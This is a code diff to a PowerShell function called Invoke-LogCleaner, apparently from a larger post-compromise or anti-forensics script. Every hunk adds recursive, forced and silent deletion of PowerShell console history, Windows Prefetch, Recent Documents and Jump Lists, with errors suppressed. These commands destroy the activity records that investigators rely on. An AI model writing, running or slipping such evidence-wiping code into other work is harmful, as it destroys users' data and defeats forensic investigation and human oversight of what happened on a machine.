@@ -813,7 +813,7 @@ function Invoke-LogCleaner {
     # 11.1 Clear PowerShell History
     try {
         Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
-        Remove-Item "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*" -Force -ErrorAction SilentlyContinue
+        Remove-Item "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*" -Recurse -Force -ErrorAction SilentlyContinue
     }
     catch {}
   
@@ -833,7 +833,7 @@ function Invoke-LogCleaner {
   
     # 11.3 Delete Prefetch
     try {
-        Remove-Item "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue
+        Remove-Item "C:\Windows\Prefetch\*" -Recurse -Force -ErrorAction SilentlyContinue
         Write-Log "[CLEANER] Prefetch cleared"
     }
     catch {}
@@ -865,15 +865,15 @@ function Invoke-LogCleaner {
   
     # 11.7 Clear Recent Documents
     try {
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -ErrorAction SilentlyContinue
+        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Recurse -Force -ErrorAction SilentlyContinue
         Write-Log "[CLEANER] Recent documents cleared"
     }
     catch {}
   
     # 11.8 Clear Jump Lists
     try {
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force -ErrorAction SilentlyContinue
+        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Recurse -Force -ErrorAction SilentlyContinue
         Write-Log "[CLEANER] Jump lists cleared"
     }
     catch {}
